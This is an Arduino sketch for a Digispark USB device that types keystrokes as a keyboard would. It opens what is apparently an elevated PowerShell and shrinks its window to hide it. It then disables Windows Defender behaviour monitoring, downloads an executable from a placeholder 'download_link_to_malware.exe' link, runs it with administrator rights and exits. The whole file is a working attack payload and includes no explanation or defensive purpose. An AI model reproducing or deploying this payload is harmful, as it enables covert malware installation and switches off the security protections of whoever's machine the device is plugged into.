#include "DigiKeyboard.h"

void setup() {
  DigiKeyboard.delay(500);

  DigiKeyboard.sendKeyStroke(KEY_X, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);

  for (int i = 0; i < 10; i++) {
    DigiKeyboard.sendKeyStroke(KEY_DOWN_ARROW);
    DigiKeyboard.delay(250);
  }
  
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);

  DigiKeyboard.sendKeyStroke(KEY_LEFT_ARROW);
  DigiKeyboard.delay(200);

  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2050);
  
  DigiKeyboard.print("mode 20,1");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(750);
  
  DigiKeyboard.print("Set-MpPreference -DisableBehaviorMonitoring $true");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(750);
  
  DigiKeyboard.print("$url=\"download_link_to_malware.exe\";$filePath=\"$env:TMP\\p.exe\";Invoke-WebRequest -Uri $url -OutFile $filePath;Start-Process -FilePath $filePath -Verb RunAs");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(600);
  
  DigiKeyboard.print("exit");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}

void loop() {
  // Dont touch
}
